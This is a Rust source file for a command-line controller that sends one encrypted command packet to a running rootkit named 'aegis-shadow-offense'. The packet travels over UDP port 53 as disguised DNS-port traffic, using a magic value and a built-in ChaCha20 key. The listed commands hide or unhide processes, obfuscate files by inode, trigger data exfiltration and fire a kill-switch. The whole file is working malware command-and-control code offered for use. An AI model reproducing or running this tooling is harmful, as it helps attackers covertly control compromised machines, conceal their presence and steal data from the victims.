use aegis_c2::{
    build_c2_payload, build_command_payload, generate_nonce, parse_key, send_payload, CommandKind,
};
use anyhow::{Context, Result};
use clap::Parser;
use common::{C2_CHACHA20_KEY, C2_PORT};
use std::net::Ipv4Addr;

/// Send a single C2 command to a running aegis-shadow-offense rootkit.
///
/// The rootkit's XDP program listens for encrypted C2 packets on UDP port 53
/// (magic 0xDEADBEEF, ChaCha20 keystream + keyed HMAC). Delivery is
/// fire-and-forget: the receiver never ACKs, so success means the datagram
/// was handed to the kernel, not that the rootkit is running.
#[derive(Debug, Parser)]
#[command(name = "aegis-c2")]
#[command(about = "Send a single C2 command to a running aegis-shadow-offense rootkit")]
struct Cli {
    /// IPv4 address of the host running the rootkit (the C2 channel is IPv4-only)
    #[arg(short, long)]
    target: Ipv4Addr,

    /// Destination UDP port of the C2 channel (the stock rootkit only accepts 53)
    #[arg(short, long, default_value_t = C2_PORT)]
    port: u16,

    /// C2 command to send
    #[arg(short, long, value_enum)]
    command: CommandKind,

    /// Command argument: PID for hide-pid/unhide-pid, inode for obfuscate-file (empty for exfil/kill-switch)
    #[arg(short, long)]
    arg: Option<String>,

    /// Optional 64-hex-char ChaCha20 key override (the stock rootkit uses a compile-time key and has no rotation)
    #[arg(long)]
    key: Option<String>,
}

fn main() -> Result<()> {
    let cli = Cli::parse();

    let key = match &cli.key {
        Some(hex) => parse_key(hex).context("invalid --key override")?,
        None => C2_CHACHA20_KEY,
    };

    let command =
        build_command_payload(cli.command, cli.arg.as_deref()).context("invalid command")?;

    let nonce = generate_nonce();
    let payload = build_c2_payload(&key, &nonce, &command);

    let sent = send_payload(cli.target, cli.port, &payload)
        .with_context(|| format!("failed to send C2 packet to {}:{}", cli.target, cli.port))?;

    println!(
        "sent {} bytes to {}:{} (command={}, arg={})",
        sent,
        cli.target,
        cli.port,
        cli.command.name(),
        cli.arg.as_deref().unwrap_or("")
    );
    Ok(())
}
